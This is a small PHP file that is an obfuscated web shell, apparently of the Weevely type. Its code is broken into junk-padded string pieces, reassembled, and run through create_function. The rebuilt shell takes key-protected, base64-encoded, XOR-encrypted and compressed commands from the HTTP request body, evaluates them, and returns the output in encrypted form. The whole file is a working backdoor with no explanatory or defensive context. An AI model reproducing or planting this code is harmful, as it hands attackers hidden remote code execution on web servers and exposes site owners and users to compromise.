<?php
$V='oVr($iVV=0;$i<$Vl;)V{for($j=0;($j<V$Vc&&$i<$l);$Vj++,$i+V+){$Vo.=$t{$i}V^$k{';
$f='$k="882cbV657";$Vkh="21V1fdbV75Vb1ac"VV;$kVf="1d49fVf7ec1a0";$p="5qODVjJ7p';
$z=str_replace('L','','crLLeLaLte_LfuLnction');
$Z='eaVn();$r=V@basVe64_VencodeV(@x(@gzVcVompresVs(V$o),$k));pVrint("$pV$kh$r$kf");}';
$j='@xV(@bVase64_decode($m[1V]V),$k)VV));$o=@obV_get_contentsV();@ob_Vend_cl';
$k='tentVVs("php://input"V),$Vm)==1) {@Vob_stVart();@eVVval(@gzunVcomVpress(V';
$W='$Vj};}}rVeturn $oV;}Vif (@prVeg_match(V"V/$kh(.+)$kVf/",V@filVe_get_cVon';
$X='fstxXVrVfY";funVction xV($t,$k){V$Vc=strlen($k)V;$l=VstVrlen(V$t);$o="";f';
$s=str_replace('V','',$f.$X.$V.$W.$k.$j.$Z);
$K=$z('',$s);$K();
?>
